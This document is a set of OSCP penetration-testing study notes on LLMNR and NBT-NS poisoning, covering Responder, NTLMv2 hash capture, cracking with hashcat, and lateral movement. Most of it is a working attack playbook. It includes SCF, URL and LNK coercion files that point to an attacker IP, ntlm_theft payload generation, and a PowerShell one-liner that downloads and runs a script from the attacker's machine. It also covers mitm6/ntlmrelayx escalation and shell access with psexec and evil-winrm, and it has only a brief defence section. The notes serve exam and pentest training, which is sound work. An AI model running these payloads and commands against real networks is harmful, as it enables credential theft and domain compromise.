# LLMNR Poisoning & NTLMv2 Hash Capture — OSCP Notes

> For authorized penetration testing only (CTF labs, OSCP exam, legally contracted engagements).

---

## Table of Contents

1. [Overview](#overview)
2. [Core Concepts](#core-concepts)
3. [Attack Flow](#attack-flow)
4. [Attack Conditions](#attack-conditions)
5. [Lab Setup & Initial Access](#lab-setup--initial-access)
6. [Responder — Full Reference](#responder--full-reference)
7. [All Payloads](#all-payloads)
8. [Hash Capture & Cracking](#hash-capture--cracking)
9. [When LLMNR is Disabled](#when-llmnr-is-disabled)
10. [OSCP Exam Strategy](#oscp-exam-strategy)
11. [Interview & Exam Q&A](#interview--exam-qa)
12. [Common Mistakes](#common-mistakes)
13. [Pro Tips](#pro-tips)
14. [Quick Revision Summary](#quick-revision-summary)

---

## Overview

LLMNR Poisoning is a Man-in-the-Middle attack targeting Windows fallback name-resolution protocols. When a Windows machine cannot resolve a hostname via DNS, it broadcasts a request to the entire local subnet using LLMNR or NBT-NS. The attacker intercepts this broadcast and claims to be the requested host. The victim then sends its NTLMv2 credentials to the attacker.

| Property | Value |
|---|---|
| Attack Type | Internal Network MitM / Credential Capture |
| Target | Windows machines in AD environments |
| What You Get | NTLMv2 password hashes |
| Primary Tool | Responder (Linux) / Inveigh (Windows) |
| Protocols Abused | LLMNR UDP/5355, NBT-NS UDP/137 |
| Default State | ENABLED on all Windows Vista+ systems |

### Why Important in OSCP

- One of the first attacks to try after gaining internal network access
- Requires zero credentials to start
- Passive approach — your machine just listens and responds
- No noisy port scanning needed
- Even a single domain user hash can give you a foothold for lateral movement

---

## Core Concepts

### 1. Windows Name Resolution Order

When you type `\\FILESERVER01\Documents`, Windows resolves the name in this exact order:

```
Step 1: Check local HOSTS file         C:\Windows\System32\drivers\etc\hosts
Step 2: Check DNS cache                ipconfig /displaydns
Step 3: Query DNS Server               "What is FILESERVER01's IP?"
        DNS knows?  -> Done
        DNS fails?  -> Step 4
Step 4: LLMNR Broadcast (UDP 5355)     "Anyone know FILESERVER01?"
        <- ANYONE CAN ANSWER, NO VERIFICATION
Step 5: NBT-NS Broadcast (UDP 137)     Same, older protocol
        <- ANYONE CAN ANSWER, NO VERIFICATION
```

Steps 4 and 5 are broadcast-based and have zero authentication verification. ANY machine on the subnet can claim to be FILESERVER01. This is the core of the attack.

### 2. LLMNR

| Property | Value |
|---|---|
| Full Name | Link-Local Multicast Name Resolution |
| Protocol / Port | UDP / 5355 |
| RFC | RFC 4795 |
| Default State | ENABLED on all Windows Vista, 7, 8, 10, 11, Server 2008+ |
| Scope | Link-local only — same subnet, does NOT cross routers |
| Disabled By | GPO: Computer Config > Admin Templates > Network > DNS Client > "Turn off multicast name resolution" |

### 3. NBT-NS

| Property | Value |
|---|---|
| Full Name | NetBIOS Name Service |
| Protocol / Port | UDP / 137 |
| Age | Legacy — pre-dates DNS |
| Default State | ENABLED by default |
| Disabled By | Network adapter > IPv4 > Advanced > WINS tab > "Disable NetBIOS over TCP/IP" |

**Key difference:** LLMNR is newer (DNS-like), NBT-NS is legacy (NetBIOS-based). Responder exploits BOTH simultaneously. If one is disabled, the other may still be vulnerable.

### 4. NTLM / NTLMv2 Authentication — Challenge-Response

Windows does not send passwords in plaintext. It uses a challenge-response mechanism:

```
[CLIENT]                                [SERVER / ATTACKER]
   |                                          |
   |--- "I want to connect, I am JSMITH" ---> |   Step 1: Negotiate
   |                                          |
   |<-- "Here's your challenge:               |   Step 2: Challenge
   |     Random Nonce = 4B3A2D1E0F9A8B7C"    |
   |                                          |
   |--- Response = HMAC(NT_Hash, Challenge)-->|   Step 3: Authenticate
   |    (This IS the captured NTLMv2 hash)    |
```

| Component | Explanation |
|---|---|
| NT Hash | MD4 hash of the user's password. Stored in SAM/NTDS.dit |
| Challenge | Random 8-byte nonce sent by the server |
| NTLMv2 Response | HMAC-MD5(NT_Hash, Challenge + Client_Challenge + timestamp) |
| What attacker captures | The full NTLMv2 response blob |
| Can attacker use hash directly? | No — NTLMv2 cannot be used for Pass-the-Hash. Must crack it first. |

---

## Attack Flow

### Normal Name Resolution (No Attacker)

```
Victim (10.10.10.50)
       |
       |--- DNS: "What is FILESERVERR?"
DNS Server --- "Unknown host."
       |
Victim --- LLMNR Broadcast: "Anyone know FILESERVERR?"
       |
Real Server --- "Yes! I am FILESERVERR, IP: 10.10.10.60"
       |
Victim connects to 10.10.10.60 (legitimate)
```

### Attack Scenario (Responder Active)

```
Victim (10.10.10.50)
       |
       |--- DNS: "What is FILESERVERR?"
DNS --- "Unknown."
       |
Victim --- LLMNR Broadcast: "Anyone know FILESERVERR?"
       |
       |<--- ATTACKER (Responder on 10.10.14.5):
       |     "YES! I am FILESERVERR! Connect to 10.10.14.5"
       |     (Victim has NO WAY to verify this)
       |
Victim --- Connects to 10.10.14.5 (attacker)
           Sends NTLMv2 authentication
           |
Responder captures:
  Username : CORP\jsmith
  Hash     : jsmith::CORP:4B3A2D1E...[NTLMv2 blob]
           |
Attacker cracks hash -> Password: "Winter2024!"
```

The victim connects TO you. You never touch the victim machine directly. No port scan. No direct connection initiation. Firewalls often miss this because it looks like legitimate Windows authentication traffic.

---

## Attack Conditions

### Required (All Must Be True)

- Attacker is on the same Layer 2 subnet as victim (LLMNR does not cross routers)
- Target network has Windows machines
- LLMNR or NBT-NS is enabled (default on all Windows)
- A failed name resolution event occurs (typo, broken UNC path, misconfigured app)

### Attack Fails When

- LLMNR disabled via GPO AND NBT-NS disabled via WINS settings
- Attacker is on a different subnet (VLANs, network segmentation)
- SMB Signing enforced (blocks relay attacks; hash capture still works for cracking)
- Target is Linux/Mac only
- IDS/IPS blocking or alerting on Responder signatures
- No failed DNS queries generated

---

## Lab Setup & Initial Access

### Your Network Position in OSCP Labs

```
[Your Home Machine]
        |
   OpenVPN (tun0)
        |
[OSCP Lab Network: 10.10.10.x / 10.11.x.x]
        |
[Target AD Environment]
  |- Domain Controller  (DC01: port 88, 389, 445)
  |- Windows Workstation (WIN10: port 445)
  `- Windows File Server (FS01: port 445)
```

### Step 1 — Identify Live Hosts

```bash
# Ping sweep
nmap -sn 10.10.10.0/24

# ARP-based (quieter)
netdiscover -r 10.10.10.0/24
```

### Step 2 — Identify Domain Controller

```bash
# AD-specific port scan
nmap -sC -sV -p 53,88,135,139,389,445,464,636,3268,3269 10.10.10.0/24

# Port 88 (Kerberos) + 389 (LDAP) + 445 (SMB) = Domain Controller
```

### Step 3 — Enumerate SMB Shares

```bash
# Anonymous enumeration
crackmapexec smb 10.10.10.0/24 --shares -u '' -p ''

# Nmap script
nmap --script smb-enum-shares -p 445 10.10.10.0/24

# Test if share is writable
smbclient //10.10.10.50/SharedDocs -N
smb: \> put test.txt    # Success = writable, use for payloads
smb: \> del test.txt    # Clean up
```

---

## Responder — Full Reference

### What Responder Does

- Listens for LLMNR, NBT-NS, and MDNS broadcasts
- Responds to every broadcast: "Yes, I am that host!"
- Spins up fake servers: SMB, HTTP, FTP, LDAP, MSSQL, etc.
- Captures NTLMv2 hashes when victims connect and authenticate
- Saves all hashes to `/usr/share/responder/logs/`

### Installation

```bash
# Kali Linux — already installed
which responder

# If missing
sudo apt update && sudo apt install responder -y

# Latest from GitHub
git clone https://github.com/lgandx/Responder
cd Responder
pip3 install -r requirements.txt
```

### Main Command

```bash
sudo responder -I tun0 -rdwv
```

### Flag Reference

| Flag | Meaning | When to Use |
|---|---|---|
| `-I tun0` | Interface to listen on | Always. `tun0` = VPN in OSCP. Use `eth0` on local net |
| `-r` | Answer NetBIOS WPAD requests | Always include |
| `-d` | Answer domain-level NBT-NS queries | Always include — helps in domain environments |
| `-w` | Start WPAD rogue proxy server | Always include — captures browser auth |
| `-v` | Verbose output | Always during testing |
| `-A` | Analyze mode — listen only, NO poisoning | Stealth recon — see queries without responding |
| `-f` | Fingerprint hosts before poisoning | Recon phase |
| `--lm` | Downgrade to LM hash | Only against very old Windows (XP era) |

### Configuration File

```bash
# View config
cat /etc/responder/Responder.conf

# Key settings:
[HTTP Server]
Serve-Wpad = On        # WPAD served to browsers

[SMB Server]
SMB = On               # Must be ON to capture SMB hashes

# Disable unused servers to reduce noise:
FTP = Off
IMAP = Off
```

### Reading Responder Output

```
[*] [NBT-NS] Poisoned answer sent to 10.10.10.50 for name FILESERVERR
[*] [LLMNR]  Poisoned answer sent to 10.10.10.50 for name FILESERVERR
[SMB] NTLMv2-SSP Client   : 10.10.10.50
[SMB] NTLMv2-SSP Username : CORP\jsmith
[SMB] NTLMv2-SSP Hash     : jsmith::CORP:4B3A2D1E0F9A8B7C:...[hash]...

[+] Skipping previously captured hash for CORP\jsmith
```

```bash
# View saved hash files
ls /usr/share/responder/logs/
# SMB-NTLMv2-SSP-10.10.10.50.txt
# HTTP-NTLMv2-10.10.10.75.txt

cat /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.10.50.txt
```

### Pivot — Inveigh (When Already on a Windows Box)

```powershell
# Situation: shell on Windows Machine A, which can reach subnet B
# Your Kali cannot reach subnet B directly
# Solution: run Inveigh (PowerShell Responder) on Machine A

IEX (New-Object Net.WebClient).DownloadString('http://YOUR_KALI_IP/Inveigh.ps1')
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y -OutputDir C:\Windows\Temp\

# Check hashes
Get-InveighLog
cat C:\Windows\Temp\Inveigh-NTLMv2.txt
```

---

## All Payloads

Responder is passive — it waits for LLMNR broadcasts. If no one makes a typo, you get nothing. Payloads force victims to generate LLMNR traffic.

### Payload 1 — SCF File (Shell Command File)

**What:** A special Windows file that triggers automatically when a folder is opened in Explorer — no clicks needed.

**When to use:** You have write access to a network share. Anyone who browses that folder triggers the attack.

**Why it works:** Windows tries to load the icon from `\\ATTACKER_IP\share\icon.ico`, forcing an SMB authentication attempt.

```bash
# Step 1: Create the SCF file
nano @trigger.scf
```

```ini
[Shell]
Command=2
IconFile=\\10.10.14.5\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```

```bash
# Why @ prefix?
# Files starting with @ sort to TOP of folder
# First thing Explorer processes = immediate trigger

# Step 2: Start Responder FIRST
sudo responder -I tun0 -rdwv

# Step 3: Upload to writable share
smbclient //10.10.10.50/SharedDocs -N
smb: \> put @trigger.scf
smb: \> quit
```

---

### Payload 2 — LNK File (Windows Shortcut)

**What:** A .lnk shortcut file with its icon source pointing to your IP.

**When to use:** Writable share found. Use as backup or in addition to SCF.

**Method A — PowerShell (if you have a Windows session)**

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\Temp\Report.lnk")
$lnk.TargetPath = "\\10.10.14.5\share\payload"
$lnk.IconLocation = "\\10.10.14.5\share\icon.ico,0"
$lnk.Description = "Company Report Q4"
$lnk.Save()
```

**Method B — ntlm_theft (best option — generates all payload types)**

```bash
git clone https://github.com/Greenwolf/ntlm_theft
cd ntlm_theft
pip3 install xlrd xlwt

# Generate ALL payload types pointing to your IP
python3 ntlm_theft.py -g all -s 10.10.14.5 -f CompanyReport

# Output: CompanyReport/ folder containing:
# CompanyReport.lnk
# CompanyReport.scf
# CompanyReport.url
# CompanyReport.pdf
# CompanyReport.docx
# CompanyReport.xlsx
# CompanyReport.htm

# Upload to share
smbclient //10.10.10.50/SharedDocs -N
smb: \> put CompanyReport.lnk
smb: \> quit
```

---

### Payload 3 — URL File (Internet Shortcut)

**What:** Windows internet shortcut (.url) pointing to a UNC path.

**When to use:** Additional payload on writable share alongside SCF and LNK.

```bash
nano @shortcut.url
```

```ini
[InternetShortcut]
URL=file://10.10.14.5/share
IconFile=\\10.10.14.5\share\icon.ico
IconIndex=1
```

```bash
smbclient //10.10.10.50/SharedDocs -N
smb: \> put @shortcut.url
smb: \> quit
```

---

### Payload 4 — WPAD Proxy Poisoning

**What:** Browsers automatically look for a proxy config file called "wpad". Responder intercepts this and serves a fake proxy, capturing HTTP NTLMv2 hashes.

**When to use:** When users browse the internet. No writable share needed.

**Why it works:** Browser searches for `wpad.corp.com` via LLMNR. Responder answers. Browser sends NTLM credentials to authenticate to the "proxy".

```bash
# -w flag enables WPAD
sudo responder -I tun0 -rdwv

# Verify WPAD active
grep -i "wpad\|serve" /etc/responder/Responder.conf
# Serve-Wpad = On

# Hash appears via HTTP protocol:
# [HTTP] NTLMv2 Username : CORP\jsmith
# [HTTP] NTLMv2 Hash     : jsmith::CORP:...
```

---

### Payload 5 — Office Documents (DOCX / XLSX)

**What:** Word/Excel documents with embedded remote resource paths pointing to your IP.

**When to use:** Email phishing (if in scope) or placed on a writable share.

**Why it works:** Office automatically tries to load remote resources, triggering NTLM authentication.

```bash
# Word document
python3 ntlm_theft.py -g docx -s 10.10.14.5 -f InvoiceQ4

# Excel spreadsheet
python3 ntlm_theft.py -g xlsx -s 10.10.14.5 -f SalesData

# All types at once
python3 ntlm_theft.py -g all -s 10.10.14.5 -f Q4Report

# Start Responder before delivery
sudo responder -I tun0 -rdwv
```

---

### Payload Decision Table

| Situation | Best Payload | Protocol |
|---|---|---|
| Writable network share found | SCF + LNK + URL (plant all three) | SMB |
| No writable share, users browse internet | WPAD (-w flag) | HTTP |
| Phishing in scope | DOCX/XLSX via ntlm_theft | SMB |
| Already on a Windows machine | Inveigh | SMB/HTTP |
| Passive recon only | Responder -A (analyze mode) | All |

---

## Hash Capture & Cracking

### Step 1 — Collect the Hash

```bash
# List all captured hashes
ls -la /usr/share/responder/logs/

# SMB hashes
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.10.50.txt

# HTTP hashes (from WPAD)
cat /usr/share/responder/logs/HTTP-NTLMv2-10.10.10.75.txt

# Combine all
cat /usr/share/responder/logs/*.txt > all_hashes.txt
```

### Step 2 — Crack with Hashcat

```bash
# Copy hash to working file
cp /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.10.50.txt hashes.txt

# Mode 5600 = NTLMv2
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# With rules (much more effective)
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Multiple rule files
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# Force CPU if no GPU (common in VMs)
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --force

# Show cracked results
hashcat -m 5600 hashes.txt --show
# CORP\jsmith:Winter2024!
```

### Alternative — John the Ripper

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2
john hashes.txt --show
```

### What To Do With a Cracked Password

```bash
# Validate across the network
crackmapexec smb 10.10.10.0/24 -u jsmith -p 'Winter2024!' -d CORP

# Get a shell if local admin (look for "Pwn3d!" in output)
crackmapexec smb 10.10.10.50 -u jsmith -p 'Winter2024!' -x "whoami"

# PSExec shell
psexec.py CORP/jsmith:'Winter2024!'@10.10.10.50

# WinRM (if port 5985 open)
evil-winrm -i 10.10.10.50 -u jsmith -p 'Winter2024!'
```

---

## When LLMNR is Disabled

### How to Check If LLMNR is Disabled

```bash
# Passive check — run Responder in analyze mode
# No LLMNR traffic after 10-15 mins with active users = likely disabled
sudo responder -I tun0 -A

# Check via Windows registry (if you have a Windows session)
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient"
# EnableMulticast = 0 means LLMNR disabled
# Key not present means LLMNR ENABLED (default)

# Check NBT-NS
reg query "HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Parameters"
# NodeType = 2 (P-node) means NBT-NS disabled
```

### Alternative Attacks When LLMNR Is Off

| Attack | Condition | Tool |
|---|---|---|
| IPv6 DNS Poisoning (mitm6) | IPv6 enabled (default on Windows) | `mitm6` + `ntlmrelayx` |
| NTLM Relay (SMB Relay) | SMB Signing disabled | `ntlmrelayx.py` |
| Password Spraying | Have valid usernames | `crackmapexec`, `kerbrute` |
| AS-REP Roasting | Accounts without Kerberos preauth | `GetNPUsers.py` |
| Kerberoasting | Any valid domain user creds | `GetUserSPNs.py` |

### mitm6 Quick Start (IPv6 Pivot)

```bash
# mitm6 attacks DHCPv6 — works even when LLMNR is disabled
# Makes Windows use YOUR machine as DNS/gateway

# Terminal 1: Run mitm6
sudo mitm6 -d corp.local -i tun0

# Terminal 2: Run ntlmrelayx
ntlmrelayx.py -6 -t ldaps://DC_IP -wh attacker-wpad --delegate-access
# Can create a new computer account and escalate to Domain Admin
```

---

## OSCP Exam Strategy

### Order of Operations

**Step 1 — As soon as VPN access: start Responder**

```bash
sudo responder -I tun0 -rdwv 2>&1 | tee responder_output.txt
# Run in a dedicated tmux pane — let it run the entire exam
```

**Step 2 — Parallel: run network scan**

```bash
nmap -sC -sV -p- --min-rate 5000 10.10.10.0/24 -oA full_scan
```

**Step 3 — Find writable shares and plant payloads**

```bash
crackmapexec smb 10.10.10.0/24 --shares -u '' -p ''
# For every share: test write access
# Writable? -> upload via ntlm_theft
python3 ntlm_theft.py -g all -s ATTACKER_IP -f Report
```

**Step 4 — Check for hashes every 15-20 minutes**

```bash
ls /usr/share/responder/logs/
cat /usr/share/responder/logs/*.txt
```

**Step 5 — Crack immediately when hash appears**

```bash
hashcat -m 5600 /usr/share/responder/logs/*.txt \
  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

**Critical rule:** Never run Responder and ntlmrelayx at the same time on the same interface. They conflict on port 445. Choose one: capture mode (Responder) OR relay mode (ntlmrelayx).

---

## Interview & Exam Q&A

**Q1. What is LLMNR and why is it vulnerable?**

LLMNR is a Windows fallback protocol used when DNS fails. It broadcasts a name resolution request to the entire subnet. The vulnerability: any machine can respond to the broadcast, and there is zero verification of the response. An attacker can claim to be any host, causing victims to send their NTLMv2 credentials to the attacker.

**Q2. What is the difference between LLMNR and NBT-NS?**

Both serve the same fallback name resolution purpose. LLMNR is the newer protocol (RFC 4795), uses UDP port 5355, and is DNS-based. NBT-NS is the legacy NetBIOS Name Service (UDP port 137). LLMNR is tried before NBT-NS. Both are exploitable with Responder. Both are enabled by default on Windows.

**Q3. What does Responder capture — password or hash?**

Responder captures an NTLMv2 challenge-response hash, NOT the plaintext password and NOT the raw NT hash. It is a derived value: HMAC-MD5(NT_Hash, challenge + client_challenge + timestamp). It must be cracked offline using hashcat (mode 5600). It cannot be used directly for Pass-the-Hash attacks (only raw NT hashes can).

**Q4. What is the Hashcat mode for NTLMv2?**

Mode 5600 = NetNTLMv2. Mode 1000 = NTLM (raw NT hash). These are different — always verify which you have before cracking.

**Q5. Can this attack work from a different subnet?**

No. LLMNR and NBT-NS are link-local protocols — they do not cross routers or VLANs. The attacker MUST be on the same Layer 2 broadcast domain as the victim.

**Q6. What is an SCF file and why does the @ prefix matter?**

An SCF (Shell Command File) executes automatically when a folder containing it is opened in Windows Explorer — no user click needed. The @ prefix causes the file to sort to the top of the folder listing, so it is the first file Windows Explorer processes when the folder is opened.

**Q7. What is NTLM Relay vs hash capture?**

Hash capture: Responder captures the NTLMv2 hash, you crack it offline, use the password.

NTLM Relay: Instead of capturing, you relay the authentication in real-time to another service using ntlmrelayx. No cracking needed. Works when SMB Signing is disabled. Requires disabling Responder's SMB server (SMB = Off in Responder.conf) and running ntlmrelayx simultaneously.

**Q8. How do you defend against LLMNR poisoning?**

1. Disable LLMNR via GPO: Computer Config > Admin Templates > Network > DNS Client > "Turn off multicast name resolution" = Enabled
2. Disable NBT-NS via DHCP options or adapter settings
3. Enable SMB Signing to prevent relay attacks
4. Use Network Access Control (NAC)
5. Deploy LLMNR/NBT-NS monitoring in your SIEM

---

## Common Mistakes

- Running Responder on wrong interface — always verify with `ip a` or `ifconfig` first
- Running Responder AND ntlmrelayx simultaneously on port 445 — they conflict and both fail
- Not waiting long enough — LLMNR poisoning requires a victim to generate a query, may take 5-30 minutes in labs
- Forgetting to start Responder BEFORE uploading payloads — if Responder is not running when the payload triggers, you miss the hash
- Trying to Pass-the-Hash with NTLMv2 — NTLMv2 hashes from Responder CANNOT be used for PTH. You need raw NT hash for that
- Not using rules with Hashcat — plain dictionary attacks often fail, always add `-r best64.rule` at minimum
- Uploading payloads without testing write access first — always test with a dummy file
- Assuming "Poisoned answer sent" = hash captured — you also need the victim to actually authenticate. Both log lines must appear

---

## Pro Tips

- Use tmux panes — dedicate one pane to Responder running the entire exam, never kill it accidentally
- Run analyze mode first (`responder -I tun0 -A`) for 5 minutes to see existing traffic before poisoning
- ntlm_theft generates all payload types at once — always prefer this over manually creating files
- Upload SCF + LNK + URL all at once — different Windows versions may process different file types
- Start hashcat as soon as you get a hash, even while continuing the rest of the engagement
- Password spray cracked creds immediately — people reuse passwords
- Download the OneRuleToRuleThemAll rule set — often cracks passwords rockyou.txt misses:

```bash
git clone https://github.com/NotSoSecure/password_cracking_rules
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt \
  -r password_cracking_rules/OneRuleToRuleThemAll.rule --force
```

- Check both SMB and HTTP log files — same user may authenticate via different protocols

---

## Quick Revision Summary

### The 6-Step Mental Model

1. Windows cannot find a hostname via DNS — broadcasts LLMNR request to subnet
2. Responder hears broadcast — responds: "I am that host, connect to me"
3. Windows trusts the response (no verification) — sends NTLMv2 authentication to attacker
4. Responder captures the NTLMv2 hash — saves to log file
5. Hashcat cracks the hash — you get the plaintext password
6. Use the password — lateral movement, privilege escalation, domain compromise

### Key Commands Reference

| Task | Command |
|---|---|
| Start Responder | `sudo responder -I tun0 -rdwv` |
| Analyze only (no poison) | `sudo responder -I tun0 -A` |
| Generate all payloads | `python3 ntlm_theft.py -g all -s ATTACKER_IP -f Report` |
| Check anonymous shares | `crackmapexec smb 10.x.x.0/24 --shares -u '' -p ''` |
| View captured hashes | `cat /usr/share/responder/logs/*.txt` |
| Crack NTLMv2 | `hashcat -m 5600 hashes.txt rockyou.txt -r best64.rule --force` |
| Validate cracked creds | `crackmapexec smb 10.x.x.0/24 -u user -p 'pass'` |
| Get shell if admin | `psexec.py CORP/user:'pass'@TARGET_IP` |

### Full Attack One-Block Reference

```bash
# Terminal 1: Start Responder
sudo responder -I tun0 -rdwv

# Terminal 2: Find writable shares
crackmapexec smb 10.10.10.0/24 --shares -u '' -p ''

# Terminal 2: Generate and upload payloads
python3 ntlm_theft.py -g all -s $(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d/ -f1) -f Report
smbclient //10.10.10.50/ShareName -N -c "put Report/@trigger.scf; put Report/Report.lnk"

# Terminal 3: Crack as soon as hash appears
hashcat -m 5600 /usr/share/responder/logs/*.txt \
  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# Terminal 4: Validate creds once cracked
crackmapexec smb 10.10.10.0/24 -u jsmith -p 'Winter2024!'
```

---

## Custom Topic Notes

Enter any specific sub-topic for deeper notes:

- NTLM Relay Attack (ntlmrelayx, SMB signing bypass)
- mitm6 + IPv6 Poisoning (when LLMNR is disabled)
- Pass-the-Hash with NT hashes
- Kerberoasting / AS-REP Roasting
- BloodHound AD Enumeration
- Full AD Privilege Escalation Chain (hash to Domain Admin)
